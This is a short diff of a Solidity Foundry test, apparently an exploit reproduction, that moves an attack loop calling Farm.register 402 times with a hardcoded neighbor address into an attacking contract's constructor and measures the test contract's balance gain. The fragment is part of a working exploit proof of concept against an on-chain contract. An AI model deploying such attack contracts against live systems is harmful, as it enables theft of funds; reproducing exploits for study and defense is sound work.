@@ -37,17 +37,12 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        uint256 beforeBalance = address(this).balance;
+
         attacker1 = new AttackContract{value: 5e14}();
         attacker2 = new AttackContract{value: 5e14}();
         attacker3 = new AttackContract{value: 5e14}();
         attacker4 = new AttackContract{value: 5e14}();
-
-        uint256 beforeBalance = address(this).balance;
-
-        attacker1.attack();
-        attacker2.attack();
-        attacker3.attack();
-        attacker4.attack();
 
         uint256 afterBalance = address(this).balance;
 
@@ -67,9 +62,7 @@ contract AttackContract {
     address public constant neighbor =
         0x14598f3a9f3042097486DC58C65780Daf3e3acFB;
 
-    constructor() payable {}
-
-    function attack() external {
+    constructor() payable {
         for (uint256 i; i < 402; ++i) {
             Farm.register(neighbor);
         }
